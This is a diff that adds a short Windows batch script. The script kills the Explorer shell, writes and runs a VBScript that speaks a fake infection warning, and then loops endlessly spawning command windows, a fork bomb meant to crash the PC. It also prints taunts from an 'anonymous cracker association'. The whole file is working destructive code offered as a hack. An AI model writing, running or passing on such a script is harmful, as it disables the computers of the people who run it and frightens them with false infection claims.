@@ -1,0 +1,25 @@
+@echo off
+
+taskkill /f /im "explorer.exe"
+echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "speech.Vbs"
+set "text=Hello your device is infected with A C A your pc will now crash"
+echo speech.speak "%text%" >> "speech.vbs"
+start speech.vbs
+
+color 2
+:loop2
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+start
+
+echo this is a hack for the A.C.A the anonymous cracker association...get hacked loser you pc will now crash :)
+echo this is a hack for the A.C.A the anonymous cracker association...get hacked loser you pc will now crash :)
+goto loop2
